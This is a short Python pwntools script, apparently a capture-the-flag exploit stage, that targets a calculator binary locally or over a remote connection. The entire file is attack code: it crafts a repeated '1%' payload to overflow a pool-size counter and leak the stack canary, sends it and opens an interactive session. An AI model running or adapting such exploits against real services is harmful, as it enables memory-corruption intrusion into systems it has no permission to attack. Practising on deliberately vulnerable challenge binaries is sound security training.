#!/usr/bin/env python3
from pwn import *

if len(sys.argv) >= 2 and sys.argv[1] == "remote":
    p = remote(URL, PORT)
else:
    p = process("./bin/calc")

# overflow the pool_size and leak canary
leak_canary = b"1%" * (4 + 4 + (0x59c - 0xc) // 4)
leak_canary = leak_canary[:-1]
print(leak_canary, len(leak_canary))

if len(sys.argv) >= 2 and sys.argv[1] == "debug":
    with open("./debug", "wb") as f:
        f.write(leak_canary)
        f.close()

p.sendline(leak_canary)
p.interactive()
